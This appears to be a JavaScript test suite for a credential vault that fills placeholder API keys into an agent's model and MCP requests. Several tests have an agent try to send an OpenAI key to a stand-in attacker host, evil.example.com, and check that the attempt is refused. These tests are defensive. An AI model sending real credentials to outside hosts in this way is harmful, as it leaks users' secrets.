import assert from 'node:assert/strict';
import { test } from 'node:test';
import { attest, CONFIG, config } from './attest.mjs';
import { setup } from './setup.mjs';

const { embedder, served } = await setup();

const OPENAI_KEY = 'fake-openai-key-0201';
const ADOBE_KEY = 'fake-adobe-token-0202';
const GH = 'fake-gh-token-0203';
const OWNER = { pid: 9, ppid: 1, uid: 1000, gid: 1000, tag: 'cone', users: 'enforce' };

async function ready(t) {
  const page = await embedder(t);
  await page.evaluate(() => window.harness.connect());
  const put = (fields) => page.evaluate((f) => window.harness.call('put', f), fields);
  const openai = await put({
    name: 'OPENAI_API_KEY',
    value: OPENAI_KEY,
    kind: 'model',
    provider: 'openai',
  });
  const adobe = await put({
    name: 'ADOBE_IMS_TOKEN',
    value: ADOBE_KEY,
    kind: 'model',
    provider: 'adobe',
  });
  const gh = await put({ name: 'GH_TOKEN', value: GH });
  const text = config({ GH_TOKEN: gh.placeholder }, [
    { secret: 'GH_TOKEN', domain: 'api.github.com' },
  ]);
  const policy = await page.evaluate(
    (files) => window.harness.policy(files),
    [attest(CONFIG, text)]
  );
  assert.equal(policy.accepted, true);
  await page.evaluate(() => window.harness.agent());
  const ask = (op, fields) => page.evaluate((o, f) => window.harness.ask(o, f), op, fields);
  return { page, ask, openai, adobe, gh };
}

const req = (url, headers) => ({ method: 'POST', url, headers, body: '{}' });

test("NEGATIVE exfiltration: an agent's { provider, url } never sends that provider's key there", async (t) => {
  const { ask, openai } = await ready(t);
  const registered = await ask('endpoints', {
    model: [
      { provider: 'openai', url: 'https://evil.example.com/v1' },
      'https://evil.example.com/v2',
    ],
  });
  assert.equal(registered.ok, true);
  for (const url of [
    'https://evil.example.com/v1/chat/completions',
    'https://evil.example.com/v2/x',
  ]) {
    const sent = await ask('model', {
      provider: 'openai',
      request: req(url, [['authorization', `Bearer ${openai.placeholder}`]]),
    });
    assert.equal(sent.error.code, 'EACCES');
    assert.match(sent.error.message, /sent only to openai's own endpoints/);
    assert.ok(!JSON.stringify(sent).includes(OPENAI_KEY));
  }
  const own = await ask('model', {
    provider: 'openai',
    request: req('https://api.openai.com/v1/chat/completions', [
      ['authorization', `Bearer ${openai.placeholder}`],
    ]),
  });
  assert.deepEqual(own.request.headers, [['authorization', `Bearer ${OPENAI_KEY}`]]);
});

test("a provider's custom base URL comes only from the page, and Adobe's proxy is built in", async (t) => {
  const { page, ask, openai, adobe } = await ready(t);
  const proxy = await ask('model', {
    provider: 'adobe',
    request: req('https://adobe-llm-proxy.paolo-moz.workers.dev/v1/messages', [
      ['authorization', `Bearer ${adobe.placeholder}`],
    ]),
  });
  assert.deepEqual(proxy.request.headers, [['authorization', `Bearer ${ADOBE_KEY}`]]);
  const gateway = 'https://gateway.example.com/openai';
  const before = await ask('model', {
    provider: 'openai',
    request: req(`${gateway}/chat`, [['authorization', `Bearer ${openai.placeholder}`]]),
  });
  assert.equal(before.error.code, 'EACCES');
  const set = await page.evaluate(
    (url) => window.harness.call('endpoints', { model: [{ name: 'OPENAI_API_KEY', url }] }),
    gateway
  );
  assert.equal(set.ok, true);
  const after = await ask('model', {
    provider: 'openai',
    request: req(`${gateway}/chat`, [['authorization', `Bearer ${openai.placeholder}`]]),
  });
  const removed = await page.evaluate(
    (url) =>
      window.harness.call('endpoints', { remove: { model: [{ name: 'OPENAI_API_KEY', url }] } }),
    gateway
  );
  assert.equal(removed.ok, true);
  const gone = await ask('model', {
    provider: 'openai',
    request: req(`${gateway}/chat`, [['authorization', `Bearer ${openai.placeholder}`]]),
  });
  assert.equal(gone.error.code, 'EACCES');
  const bad = await page.evaluate(() =>
    window.harness.call('endpoints', { remove: { model: [7] } })
  );
  assert.equal(bad.error.code, 'EINVAL');
  assert.deepEqual(after.request.headers, [['authorization', `Bearer ${OPENAI_KEY}`]]);
});

test("an older agent's { provider, url } never fails its call, so its MCP servers still register", async (t) => {
  const { ask } = await ready(t);
  const registered = await ask('endpoints', {
    model: [
      { provider: 'adobe', url: 'https://adobe-llm-proxy.paolo-moz.workers.dev' },
      { provider: 'openai', url: 'https://evil.example.com/v1' },
    ],
    mcp: [
      {
        server: 'docs',
        url: 'https://docs.example.com/mcp',
        tokenUrl: 'https://auth.example.com/token',
      },
    ],
  });
  assert.deepEqual(registered, { v: 1, id: registered.id, op: 'endpoints', ok: true });
  const granted = await ask('grant', {
    server: 'docs',
    oauth: { tokenUrl: 'https://auth.example.com/token', clientId: 'fake-client' },
    response: JSON.stringify({ token_type: 'Bearer', access_token: 'fake-docs-access-0204' }),
  });
  const placeholder = JSON.parse(granted.response).access_token;
  const filled = await ask('mcp', {
    server: 'docs',
    request: req('https://docs.example.com/mcp', [['authorization', `Bearer ${placeholder}`]]),
  });
  assert.deepEqual(filled.request.headers, [['authorization', 'Bearer fake-docs-access-0204']]);
});

test("NEGATIVE denial of service: an agent's registrations never make a user's secret rule inert", async (t) => {
  const { page, ask, gh } = await ready(t);
  const registered = await ask('endpoints', {
    model: ['https://api.github.com', { provider: 'openai', url: 'https://api.github.com/v1' }],
    mcp: [{ server: 'gh', url: 'https://api.github.com/mcp', names: [] }],
  });
  assert.equal(registered.ok, true);
  const list = (await page.evaluate(() => window.harness.call('list'))).list;
  assert.deepEqual(list.refused, []);
  assert.equal(list.secrets.find((s) => s.name === 'GH_TOKEN').state, 'active');
  for (const url of [
    'https://api.github.com/repos/x',
    'https://api.github.com/mcp/tools',
    'https://api.github.com/v1/x',
  ]) {
    const sent = await page.evaluate((f) => window.harness.forward(f), {
      head: { method: 'GET', url, headers: [['Authorization', `Bearer ${gh.placeholder}`]] },
      owner: OWNER,
      exit: 'page',
      rawTraits: {},
    });
    assert.deepEqual(sent.reply.head.headers, [['Authorization', `Bearer ${GH}`]], url);
  }
});

test('NEGATIVE stored agent-registered { provider, url } entries are purged on upgrade, and only those beyond the built-in list are audited', async (t) => {
  const { page, ask, openai } = await ready(t);
  const ns = served.origin('seven');
  await page.goto(`${served.vault}/config.json`);
  await page.evaluate(
    (key) =>
      new Promise((resolve, reject) => {
        const open = indexedDB.open('slicc-vault', 1);
        open.onerror = () => reject(open.error);
        open.onupgradeneeded = () => reject(new Error('the vault database is missing'));
        open.onsuccess = () => {
          const tx = open.result.transaction(['meta'], 'readwrite');
          const meta = tx.objectStore('meta');
          const got = meta.get(key);
          got.onsuccess = () => {
            const stored = got.result ?? { model: [], mcp: [] };
            meta.put(
              {
                ...stored,
                owned: [
                  { provider: 'adobe', url: 'https://adobe-llm-proxy.paolo-moz.workers.dev/v1' },
                  { provider: 'openai', url: 'https://evil.example.com/v1' },
                ],
              },
              key
            );
          };
          tx.oncomplete = () => resolve(true);
          tx.onerror = () => reject(tx.error);
        };
      }),
    `endpoints:${ns}`
  );
  await embedder(t, 'seven', page);
  await page.evaluate(() => window.harness.connect());
  await page.evaluate(() => window.harness.agent());
  const stale = await ask('model', {
    provider: 'openai',
    request: req('https://evil.example.com/v1/chat', [
      ['authorization', `Bearer ${openai.placeholder}`],
    ]),
  });
  assert.equal(stale.error.code, 'EACCES');
  const audit = (await page.evaluate(() => window.harness.call('audit'))).audit;
  const purge = audit.find((entry) => entry.type === 'endpoints');
  assert.deepEqual(
    [purge.purged, purge.uid, purge.tag],
    [[{ provider: 'openai', host: 'evil.example.com' }], null, null]
  );
  await page.reload();
  await page.until(() => document.title === 'ready');
  await page.evaluate(() => window.harness.connect());
  const again = (await page.evaluate(() => window.harness.call('audit'))).audit;
  assert.equal(again.filter((entry) => entry.type === 'endpoints').length, 1);
});

test('a page endpoints request that is invalid anywhere changes nothing', async (t) => {
  const { page, ask, openai } = await ready(t);
  const gateway = 'https://gateway.example.com/openai';
  const bad = await page.evaluate(
    (url) =>
      window.harness.call('endpoints', {
        model: [{ name: 'OPENAI_API_KEY', url }],
        remove: { model: [7] },
      }),
    gateway
  );
  assert.equal(bad.error.code, 'EINVAL');
  const sent = await ask('model', {
    provider: 'openai',
    request: req(`${gateway}/chat`, [['authorization', `Bearer ${openai.placeholder}`]]),
  });
  assert.equal(sent.error.code, 'EACCES');
  const list = (await page.evaluate(() => window.harness.call('list'))).list;
  assert.deepEqual(list.refused, []);
});

test("a page-registered base URL fills only its own record's key, and goes with the record", async (t) => {
  const { page, ask, openai } = await ready(t);
  const other = await page.evaluate(() =>
    window.harness.call('put', {
      name: 'OPENAI_WORK',
      value: 'fake-openai-work-0205',
      kind: 'model',
      provider: 'openai',
    })
  );
  const gateway = 'https://gateway.example.com/openai';
  const send = (placeholder) =>
    ask('model', {
      provider: 'openai',
      request: req(`${gateway}/chat`, [['authorization', `Bearer ${placeholder}`]]),
    });
  await page.evaluate(
    (url) => window.harness.call('endpoints', { model: [{ name: 'OPENAI_API_KEY', url }] }),
    gateway
  );
  await ask('endpoints', { model: [{ provider: 'openai', url: gateway }, gateway] });
  assert.deepEqual((await send(openai.placeholder)).request.headers, [
    ['authorization', `Bearer ${OPENAI_KEY}`],
  ]);
  const crossed = await send(other.placeholder);
  assert.match(crossed.error.message, /OPENAI_WORK is sent only to openai's own endpoints/);
  assert.ok(!JSON.stringify(crossed).includes('fake-openai-work-0205'));
  await page.evaluate(() =>
    window.harness.call('remove', { name: 'OPENAI_API_KEY', kind: 'model' })
  );
  await page.evaluate(() =>
    window.harness.call('restore', { name: 'OPENAI_API_KEY', kind: 'model' })
  );
  assert.equal((await send(openai.placeholder)).error.code, 'EACCES');
});

test('NEGATIVE a page base URL must be a plain https URL of a live model record, never an MCP server', async (t) => {
  const { page } = await ready(t);
  await page.evaluate(() =>
    window.harness.call('endpoints', {
      mcp: [{ server: 'docs', url: 'https://docs.example.com/mcp' }],
    })
  );
  for (const model of [
    [{ provider: 'openai', url: 'https://gateway.example.com/v1' }],
    [{ name: 'OPENAI_API_KEY', url: 'http://gateway.example.com/v1' }],
    [{ name: 'OPENAI_API_KEY', url: 'https://gateway.example.com:8443/v1' }],
    [{ name: 'OPENAI_API_KEY', url: 'https://*.gateway.example.com/v1' }],
    [{ name: 'OPENAI_API_KEY', url: 'http://8080.kernel.localhost/v1' }],
    [{ name: 'NO_SUCH_KEY', url: 'https://gateway.example.com/v1' }],
    [{ name: 'GH_TOKEN', url: 'https://gateway.example.com/v1' }],
    [{ name: 'OPENAI_API_KEY', url: 'https://docs.example.com/mcp/v1' }],
  ]) {
    const reply = await page.evaluate((m) => window.harness.call('endpoints', { model: m }), model);
    assert.equal(reply.error?.code, 'EINVAL', JSON.stringify(model));
  }
  await page.evaluate(() =>
    window.harness.call('endpoints', {
      model: [{ name: 'OPENAI_API_KEY', url: 'https://gw.example.com/openai/v1' }],
    })
  );
  const overlap = await page.evaluate(() =>
    window.harness.call('endpoints', {
      mcp: [{ server: 'gw', url: 'https://gw.example.com/openai' }],
    })
  );
  assert.match(overlap.error.message, /is an MCP server, never a model endpoint/);
  const nested = await page.evaluate(() =>
    window.harness.call('endpoints', {
      mcp: [{ server: 'gw', url: 'https://gw.example.com/openai/v1/mcp' }],
    })
  );
  assert.match(nested.error.message, /is an MCP server, never a model endpoint/);
  const servers = await page.evaluate(() =>
    window.harness.call('endpoints', {
      mcp: [{ server: 'gw', url: 'https://gw.example.com/other' }],
    })
  );
  assert.equal(servers.ok, true);
});
